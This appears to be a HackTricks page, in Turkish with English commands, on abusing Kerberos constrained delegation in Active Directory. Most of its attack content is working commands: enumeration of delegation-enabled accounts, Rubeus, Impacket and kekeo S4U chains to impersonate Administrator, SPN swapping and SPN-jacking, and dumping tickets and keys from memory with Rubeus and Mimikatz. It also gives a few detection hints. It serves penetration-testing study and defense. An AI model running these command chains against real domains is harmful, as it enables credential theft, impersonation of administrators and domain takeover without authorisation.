# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Bununla bir Domain admin, bir bilgisayarın herhangi bir makinenin herhangi bir **service** öğesine karşı bir **user or computer** kimliğine **impersonate** olmasına **izin verebilir**.

- **Service for User to self (_S4U2self_):** Bir SPN'ye sahip olan herhangi bir **service account**, genellikle rastgele bir user adına kendisine bir TGS alabilir. Hesap ayrıca _userAccountControl_ içinde [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) değerine sahipse, bu TGS **forwardable** olur. Bu özellik, protocol transition'ı **classic constrained delegation** için doğrudan kullanışlı hâle getirir.
- **Service for User to Proxy(_S4U2proxy_):** Bir **service account**, bir user adına **msDS-AllowedToDelegateTo** içinde listelenen SPN'lere bir TGS alabilir. S4U2Proxy'de kullanılan evidence ticket, delegating service'a yönelik **forwardable** bir ticket olmalıdır: victim'dan ele geçirilen gerçek bir client-to-service ticket veya **S4U2Self + T2A4D** ile oluşturulan bir ticket.

**Note**: Bir user AD'de ‘_Account is sensitive and cannot be delegated_’ olarak işaretlenmişse veya **Protected Users** üyesiyse, constrained delegation üzerinden bu user'ı genellikle **impersonate edemezsiniz**. Modern domain'lerde delegation-enabled hesapları hedeflerken RC4-only varsayımları yerine **AES** materyalini tercih edin.

Bu, **service'ın hash'ini ele geçirirseniz**, user'ları **impersonate** edebileceğiniz ve belirtilen makineler üzerindeki herhangi bir **service**'a onların adına **erişim** elde edebileceğiniz anlamına gelir (olası **privesc**).

Ayrıca, **yalnızca user'ın impersonate edilebildiği service'a değil, herhangi bir service'a da erişiminiz olur**, çünkü SPN (istenen service adı) kontrol edilmez (ticket içinde bu bölüm şifrelenmez/imzalanmaz). Bu nedenle, **CIFS service**'ına erişiminiz varsa, örneğin Rubeus'taki `/altservice` flag'ini kullanarak **HOST service**'ına da erişebilirsiniz. Aynı SPN swapping zafiyeti **Impacket getST -altservice** ve diğer tooling tarafından da istismar edilir.

Ayrıca, bir DC üzerindeki **LDAP service** erişimi, **DCSync** istismar etmek için gereken şeydir.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operatör notu:** **gMSA/sMSA** incelemesi için yalnızca **ADUC** veya BloodHound ekran görüntülerine güvenmeyin. Bu hesaplar genellikle alışılmış Delegation sekmesini gizler; bu nedenle ham **`userAccountControl`** ve **`msDS-AllowedToDelegateTo`** attribute'larını doğrudan enumerate edin.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition ve Kerberos-only constrained delegation

Güvenliği ihlal edilmiş hesapta **T2A4D** varsa, genellikle yalnızca service key/TGT kullanarak tam **`S4U2Self -> S4U2Proxy`** zincirini tamamlayabilirsiniz.<sup>[[2]](#references)</sup>

Yalnızca **`msDS-AllowedToDelegateTo`** varsa (klasik **"Use Kerberos only"** modu), delegation hâlâ kötüye kullanılabilir; ancak S4U2Proxy için kanıt bileti, delegation yapan service için **gerçek ve forwardable bir user-to-service ticket** olmalıdır. Pratikte bu, bir victim TGS'sini **LSASS/ccache** üzerinden çalmak veya ele geçirmek ve bunu ikinci aşamaya (`/tgs:` in Rubeus) vermek anlamına gelir. **Non-forwardable** bir S4U2Self ticket, classic constrained delegation için yeterli değildir; elinizdeki tek kanıt bileti buysa bunun yerine [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) seçeneğini kontrol edin.<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notları (2025+)

**Windows Server 2012/2012 R2** sürümünden beri KDC, S4U2Proxy extensions aracılığıyla domain/forest'lar arasında **constrained delegation** desteklemektedir. Modern build'ler (Windows Server 2016–2025) bu davranışı korur ve protocol transition'ı belirtmek için iki PAC SID ekler:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), kullanıcı normal şekilde authenticate olduğunda.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), bir service protocol transition aracılığıyla identity'yi belirttiğinde.

Domain'ler arasında protocol transition kullanıldığında PAC içinde `SERVICE_ASSERTED_IDENTITY` bulunmasını bekleyin; bu, S4U2Proxy adımının başarıyla tamamlandığını doğrular.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Güncel Impacket (0.11.x+), Rubeus ile aynı S4U zincirini ve SPN swapping özelliğini sunar:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
Kullanıcı ST'sini önce forge etmeyi tercih ediyorsanız (ör. yalnızca offline hash mevcutsa), S4U2Proxy için **ticketer.py** ile **getST.py**'yi birlikte kullanın. Halihazırda çalışan bir ccache'e sahipseniz ve yalnızca aynı host için service class'ı değiştirmeniz gerekiyorsa **tgssub.py** de kullanışlıdır. Güncel sorunlar (forged ST, SPN key ile eşleşmediğinde KRB_AP_ERR_MODIFIED) için açık Impacket issue #1713'e bakın.<sup>[[2]](#references)</sup>

### SPN-jacking: constrained-delegation hedefini yönlendirme

Klasik constrained delegation, değiştirilemez bir hedef SID'si yerine `msDS-AllowedToDelegateTo` içinde bir **SPN string** yetkilendirir. S4U2Proxy sırasında KDC, o anda bu SPN'ye sahip olan hesabı çözümler ve service ticket'ı bu hesabın long-term key'i ile şifreler. Bu nedenle delegating account üzerinde kontrol ve başka bir service/computer account üzerinde `WriteSPN` yetkisi, `SeEnableDelegationPrivilege` olmadan değiştirilmemiş bir delegation constraint'ini yönlendirmek için yeterlidir.<sup>[[5]](#references)[[6]](#references)</sup>

İki varyant vardır:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** allowed SPN, önceki sahibi silindiği, yeniden adlandırıldığı veya SPN kaldırıldığı için orphaned durumdadır. SPN'yi doğrudan istenen target account'a ekleyin.
- **Live SPN-jacking:** SPN hâlâ bir source account'a aittir. Duplicate-SPN validation normalde destination write işlemini engeller; bu nedenle her iki object üzerinde de `WriteSPN` gerekir: SPN'yi source'tan kaldırın, target'a ekleyin, ticket'ı alın ve original registration'ı geri yükleyin.

Aşağıdaki soyutlanmış Linux flow, allowed SPN'yi taşır, compromised delegating principal olarak S4U çalıştırır ve ticket'ın service name'ini yeni target üzerindeki kullanışlı bir service'e yeniden yazar.<sup>[[5]](#references)[[6]](#references)</sup>
```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
-impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
"$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```
`-altservice` ikinci ve ayrı bir primitive'dir. S4U2Proxy ticket'ı artık `$DELEGATED_SPN` sahibi olan hesap için şifrelenmiştir; ticket service name (`sname`) şifrelenmiş ticket gövdesinin dışında olduğundan, tooling aynı hesap anahtarını kullanan başka bir service class/hostname ile değiştirme yapabilir. SPN-jacking öncelikle ticket'ı koruyan **account key**'in hangi hesaba ait olduğunu değiştirirken, service-class substitution bu ticket'ın nereye sunulacağını değiştirir.<sup>[[5]](#references)[[6]](#references)</sup>

Canlı jacking için, legitimate service'i bozmaktan kaçınmak amacıyla ticket acquisition işleminden hemen sonra iki LDAP write işlemini tersine çevirin. Computer-account auditing etkin olan DC'lerde, bir computer'dan `servicePrincipalName` kaldırılırken kısa süre sonra başka bir computer'a eklendiği Security event **4742** kayıtlarını arayın; özellikle SPN hostname'i hedefin `dNSHostName` değerinden farklı olduğunda. Bunu event **4769** ile ilişkilendirin: S4U2Self, client/service olarak aynı hesabı sunarken S4U2Proxy **Transited Services** alanını doldurur.<sup>[[5]](#references)</sup>

### Düşük yetkili kimlik bilgileriyle delegation kurulumunu otomatikleştirme

Bir computer veya service account üzerinde zaten **GenericAll/WriteDACL** yetkisine sahipseniz, RSAT kullanmadan gerekli attribute'ları uzaktan **bloodyAD** (2024+) ile gönderebilirsiniz:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Bu, bu özniteliklere yazabildiğiniz anda DA ayrıcalıkları olmadan privesc için bir constrained delegation path oluşturmanızı sağlar.

- Step 1: **İzin verilen servisin TGT'sini alın**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> SYSTEM olmadan, Printer Bug ve unconstrain delegation, NTLM relaying ve Active Directory Certificate Service abuse gibi yöntemlerle **TGT ticket** veya **RC4** ya da **AES256** elde etmenin **başka yolları** da vardır
>
> **Sadece bu TGT ticket'a (veya hash'ine) sahip olarak, bilgisayarın tamamını compromise etmeden bu attack'ı gerçekleştirebilirsiniz.**

- Adım2: **Kullanıcıyı impersonate ederek service için TGS alın**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.team'de daha fazla bilgi.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) ve [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Kerberos Constrained Delegation Genel Bakışı (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket ile Delegation Kötüye Kullanımı (Bölüm 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Domain'i Öldürdü: Offensive Kerberos Genel Bakışı (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: WriteSPN Kötüye Kullanımında Uç Bir Durum](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
